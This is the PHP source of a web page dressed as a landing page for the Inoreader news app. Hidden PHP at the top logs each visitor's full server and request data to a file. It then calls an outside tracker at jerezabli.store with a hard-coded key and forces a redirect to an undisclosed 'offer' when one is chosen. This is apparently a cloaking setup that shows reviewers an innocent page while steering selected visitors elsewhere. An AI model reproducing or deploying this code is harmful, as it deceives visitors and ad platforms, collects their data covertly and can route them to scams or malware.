<?php

ob_start();
echo date('Y-m-d H:i:s', time() ) . "\n";
print_r($_SERVER);
$s=null;
parse_str($_SERVER['QUERY_STRING'], $s);
if (empty($s)) echo "No params\n"; else print_r($s);
echo "---\n";
$log = ob_get_contents();
ob_end_clean();
file_put_contents("server.log", $log, FILE_APPEND);

// Query params are: utm_term={keyword}&utm_creative={creative}&utm_campaign={campaignid}&utm_position={adposition}&utm_network={network}&utm_target={target}&utm_placement={placement}&utm_match={matchtype}

require_once dirname(__FILE__) . '/kkk.php';
$client = new KClient('https://jerezabli.store/api.php?', 'hrGQhVXxxXvkbjNq');
$client->sendAllParams();       // to send all params from page query
$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
$client->param('sub_id_8', (empty($_COOKIE) ? 'no cookie' : 'ok')); // you can send any params
// $client->keyword('PASTE_KEYWORD');  // send custom keyword
// $client->currentPageAsReferrer(); // to send current page URL as click referrer
$client->disableSessions(); // to disable using session cookie (without this cookie restoreFromSession wouldn't work)
// $client->debug();              // to enable debug mode and show the errors
// $client->execute();             // request to api, show the output and continue
$client->executeAndBreak();     // to stop page execution if there is redirect or some output
?>

	<html lang="en" class="no-js">
	<head>
		<!-- Mobile Specific Meta -->
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<meta charset="UTF-8">
		<!-- Site Title -->
		<title>Inoreader - RSS & News Reader</title>

		<link href="https://fonts.googleapis.com/css?family=Poppins:100,200,400,300,500,600,700" rel="stylesheet">
			<!--
			CSS
			============================================= -->
			<link rel="stylesheet" href="css/linearicons.css">
			<link rel="stylesheet" href="css/font-awesome.min.css">
			<link rel="stylesheet" href="css/bootstrap.css">
			<link rel="stylesheet" href="css/magnific-popup.css">
			<link rel="stylesheet" href="css/owl.carousel.css">
			<link rel="stylesheet" href="css/hexagons.min.css">
			<link rel="stylesheet" href="css/main.css">
		</head>
		<body>

			<!-- start banner Area -->
			<section class="banner-area" id="home">
			<!-- Start Header Area -->
			<header class="default-header">
				<nav class="navbar navbar-expand-lg  navbar-light">
					<div class="container">
							<a class="navbar-brand" href="index.html">
								<img src="img/logo.webp" alt="" style="max-width:50px;">
							</a>


							<div class="collapse navbar-collapse justify-content-end align-items-center" id="navbarSupportedContent">
								<ul class="navbar-nav">


								</ul>
							</div>
					</div>
				</nav>
			</header>
			<!-- End Header Area -->
				<div class="container">
					<div class="row justify-content-end fullscreen align-items-center">
						<div class="col-lg-6 col-md-12 banner-left">
								<h1 class="text-white">Inoreader - RSS & News Reader</h1>
								<p class="mx-auto text-white  mt-20 mb-40">
									Used globally by techies, business professionals, digital marketers, research institutions, content publishers, and more - Inoreader is a news app that offers not only a beautiful and light reading experience, but also powerful news aggregation and curation features that let you build a perfectly personalized news feed.
								</p>
								<a href="https://play.google.com/store/apps/details?id=com.innologica.inoreader&hl=en" class="text-uppercase header-btn">Available in GooglePlay</a>
						</div>
						<div class="col-lg-6 col-md-12 no-padding banner-right">
<br>
							<img class="img-fluid" src="img/phone.webp" alt="">
						</div>
					</div>
				</div>
			</section>
			<!-- End banner Area -->



			<!-- Start about Area -->
			<section class="about-area section-gap">
				<div class="container">
					<div class="row justify-content-center align-items-center d-flex">
						<div class="col-lg-6 about-left">
							<h1>
								Here is what you get with our plans:

							</h1>
							<p class="mt-20">
								FREE Plan<br>
								- Add feeds and organize into thematic folders<br>
- Search inside your own subscriptions for FREE<br>
- Use on any device with web and mobile apps<br>
- Day and night reading modes<br>
- Free search and full archive of your subscriptions<br>
- Save articles to third-party tools like Dropbox, Evernote, OneNote, Pocket, etc.<br>
- Share to any social media or scheduling tool like Buffer and Hootsuite<br>
- Save pages from the web for viewing later<br><br>
<p><a href="https://play.google.com/store/apps/details?id=com.innologica.inoreader&hl=en" class="btn primary-btn text-uppercase mt-20">See details</a></p>
						</div>
						<div class="col-lg-6 about-right">
							<img class="img-fluid" src="img/risto.jpg" alt="">
						</div>
					</div>
				</div>
			</section>
			<!-- End about Area -->






			<!-- Start call-to-action Area -->
			<section class="call-to-action-area section-gap">
				<div class="container">
					<div class="row justify-content-center top">
						<div class="col-lg-12">
							<h1 class="text-white text-center">Download This App Today!</h1>
							<p class="text-white text-center mt-30">
								By installing Inoreader you will finally get control over the mind-boggling amount of new content being released into the web every single day.

							</p>
						</div>
					</div>
					<div class="row justify-content-center d-flex">
						<div class="download-button d-flex flex-row justify-content-center mt-30">
							<div class="buttons flex-row d-flex">
								<i class="fa fa-apple" aria-hidden="true"></i>
								<div class="desc">
									<a href="https://play.google.com/store/apps/details?id=com.innologica.inoreader&hl=en">
										<p>
											<span>Available</span> <br>
											on App Store
										</p>
									</a>
								</div>
							</div>
							<div class="buttons flex-row d-flex">
								<i class="fa fa-android" aria-hidden="true"></i>
								<div class="desc">
									<a href="https://play.google.com/store/apps/details?id=com.innologica.inoreader&hl=en">
										<p>
											<span>Available</span> <br>
											on Play Store
										</p>
									</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
			<!-- End call-to-action Area -->


			<!-- start footer Area -->
			<footer class="footer-area section-gap">
				<div class="container">
					<div class="row">

						<div class="col-lg-6  col-md-12">
							<div class="single-footer-widget newsletter">
								<h6>Newsletter</h6>
								<p>You can trust us. we only send promo offers, not a single spam.</p>
								<div id="mc_embed_signup">
									<form target="_blank" novalidate="true" action="https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01" method="get" class="form-inline">

										<div class="form-group row" style="width: 100%">
											<div class="col-lg-8 col-md-12">
												<input name="EMAIL" placeholder="Enter Email" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Enter Email '" required="" type="email">
												<div style="position: absolute; left: -5000px;">
													<input name="b_36c4fd991d266f23781ded980_aefe40901a" tabindex="-1" value="" type="text">
												</div>
											</div>

											<div class="col-lg-4 col-md-12">
												<button class="nw-btn primary-btn">Subscribe<span class="lnr lnr-arrow-right"></span></button>
											</div>
										</div>
										<div class="info"></div>
									</form>
								</div>
							</div>
						</div>

					</div>

					<div class="row footer-bottom d-flex justify-content-between">
						<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
						<p class="col-lg-8 col-sm-12 footer-text m-0 text-white">Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved |
							<a href="https://play.google.com/intl/en_ru/about/play-terms.html">Site Terms of Service</a> | <a href="https://policies.google.com/privacy">Privacy</a>
						</p>
						<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
						<div class="col-lg-4 col-sm-12 footer-social">
							<a href="https://play.google.com/store/apps/details?id=com.innologica.inoreader&hl=en"><i class="fa fa-facebook"></i></a>
							<a href="https://play.google.com/store/apps/details?id=com.innologica.inoreader&hl=en"><i class="fa fa-twitter"></i></a>
							<a href="https://play.google.com/store/apps/details?id=com.innologica.inoreader&hl=en"><i class="fa fa-dribbble"></i></a>
							<a href="https://play.google.com/store/apps/details?id=com.innologica.inoreader&hl=en"><i class="fa fa-behance"></i></a>
						</div>
					</div>
				</div>
			</footer>
			<!-- End footer Area -->

			<script src="js/vendor/jquery-2.2.4.min.js"></script>

		</body>
	</html>
